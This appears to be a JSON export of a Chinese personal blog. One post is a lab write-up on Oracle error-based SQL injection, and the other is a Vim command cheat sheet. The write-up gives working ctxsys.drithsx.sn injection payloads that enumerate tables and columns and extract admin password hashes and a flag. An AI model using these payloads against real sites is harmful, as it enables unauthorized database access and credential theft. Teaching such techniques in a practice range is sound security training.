{"meta":{"title":"niu's blog","subtitle":"","description":"","author":"Peter Niu","url":"https://uruz24.github.io","root":"/"},"pages":[],"posts":[{"title":"oracle注入报错注入oracle注入报错注入","slug":"oracle注入报错注入/oracle注入报错注入","date":"2021-09-02T14:49:57.913Z","updated":"2021-09-03T02:17:24.446Z","comments":true,"path":"2021/09/02/oracle注入报错注入/oracle注入报错注入/","link":"","permalink":"https://uruz24.github.io/2021/09/02/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/oracle%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/","excerpt":"","text":"oracle注入报错注入原理：同MYSQL数据库差不多，但是一些语法不同，相比其他数据库，oracle注入报错注入数据库的数据类型更加严谨，由于过度严谨，所以，我们用显错注入，会比较麻烦，于是，我们利用报错的方法，忽视数据类型，直接获取数据CTXSYS.DRITHSX.SN(user,()) oracle注入报错注入 基本的语法：select from all_tables 查询出所有的表 select from user_tables 查询出当前用户的表 select from all_tab_columns 查询出所有的字段 select from user_tab_columns 查询出当前用户的字段 select * from v$version 查版本 mssql系统默认库、表 sysobjects、syscolumns 、sysdatabases sql系统默认库、表 information_schema.tables 、information_schema.columns oracel 系统默认库、表 user_table dualDual是一个实表（也有人说它是虚表），如果你直接查询它，它只显示一个X，列名为DUMMY dual 虚表因为语法要求在查询时一定要加表名例如：select 1,2,3,4,5 from dual这样就不会报错，用于把语法补全oracle注入报错注入弱化了库的概念，一个用户可以简单理解为一个库 本节难点：如何实现limit 功能？oracle注入报错注入 中利用rownum=1可以取一行数据 当rownum&lt;3可以取两条 当 rownum&lt;5可以取四条rownum 的值会根据查询结果进行改变语句如下可以完成limit功能select username from(select rownum r, username from all users) where r=1子查询返回一个结果集，结果集也可以看作是一个表，其中‘r’表示一个别名，在这一句中就是rownum的别名 进入靶场发现id传参，and 1=1，网页显示正常 and 1=2 报错，表示与数据库有交互 查字段，order by 4 显示正常 order by 5 报错，有4个字段 联合查询,因为oracle注入报错注入数据库对数据类型要求很严格，所以使用语句union all select null,null,null,null from dual 下面使用oracle注入报错注入方法 优点：可以不考虑类型 原理：在数据库中对查询相应的关键词，然后查询失败，爆出数据 函数：ctxsys.drithsx.sn(user,(select banner from v$version where rownum=1))这个函数就是一个查询，而子查询优先进行，所以当查询函数查不到的时候，就会报错，但是我们真正要的数据在子查询里已经查过了，通过报错显示出来查表名and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1)) 得到表名NEWS查其他表and 1=ctxsys.drithsx.sn(1,(select table_name from user_tables where rownum=1 and table_name &lt;&gt;&#39;NEWS&#39;)) 得到ADMIN表查字段and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&#39;ADMIN&#39; and rownum=1)) 得到ID 字段查其他字段and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where rownum=1 and table_name =&#39;ADMIN&#39; and column_name&lt;&gt;&#39;ID&#39;)) 得到字段UNAME再查其他字段and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where rownum=1 and table_name =&#39;ADMIN&#39; and column_name&lt;&gt;&#39;ID&#39; and column_name&lt;&gt;&#39;UNAME&#39;)) 得到字段UPASS查内容and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 )) 得到数据：f583aea84b6ded258f529205eb6d56a7继续查其他数据and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &#39;f583aea84b6ded258f529205eb6d56a7&#39;)) 试过发现这个也不是flag，继续and 1=ctxsys.drithsx.sn(1,(select UPASS from ADMIN where rownum=1 and UPASS &lt;&gt; &#39;f583aea84b6ded258f529205eb6d56a7&#39; and UPASS &lt;&gt; &#39;9e8e7f6953dd11ceccc6ce655e03e070&#39;)) 得到flag：2a61f8bcfe7535eadcfa69eb4406ceb9输入通关","categories":[],"tags":[]},{"title":"vim终端编辑器","slug":"vim终端编辑器","date":"2021-09-02T11:20:25.910Z","updated":"2021-09-02T14:19:28.061Z","comments":true,"path":"2021/09/02/vim终端编辑器/","link":"","permalink":"https://uruz24.github.io/2021/09/02/vim%E7%BB%88%E7%AB%AF%E7%BC%96%E8%BE%91%E5%99%A8/","excerpt":"","text":"介绍：vim是vi的扩展，被誉为终端编辑器神器安装：yum install -y vim 工作模式：正常模式，插入模式，编辑模式正常模式：使用vim打开文件时的默认模式vim filename 打开文件，若文件不存在就新建文件esc：切换到正常模式shift + zz ：保存退出vim filename +n： 打开文件，定位到第n行vim filename +： 打开文件，定位到末尾gg： 定位到首行G： 定位到尾行ngg： 定位到第n行^： 定位到行首$： 定位到行尾yy： 复制光标所在行p： 粘贴nyy： 复制光标开始的n行dd： 删除光标所在行ndd： 删除光标开始的n行u： 撤销操作ctrl + r: 反撤销操作 插入模式：就是可以编辑文件内容的模式，在正常模式下输入以下字符进入：i：在光标处输入I：在行首插入a：在光标下一个字符处插入A：在行位插入o：在光标下一行插入一行空行O：在光标上一行插入一行空行s：删除光标所在字符并插入S：删除光标所在行并插入 编辑模式：是对整个文件进行的操作，如：保存、退出：w 保存：q 退出：q！ 强制退出：wq 保存退出，等价于shift+zz：x 保存退出，等价于wq：set nu 显示行号：set nonu 隐藏行号：行号 定位到指定行号/内容 查找指定内容，n下翻，N上翻：%s/原内容/新内容 使用新内容替换原内容，全部替换：m,ns/原内容/新内容 使用新内容替换原内容，替换m行到n行 友情提示：若非正常关闭vim，则会生成临时文件（隐藏的），需要删除 1","categories":[],"tags":[]}],"categories":[],"tags":[]}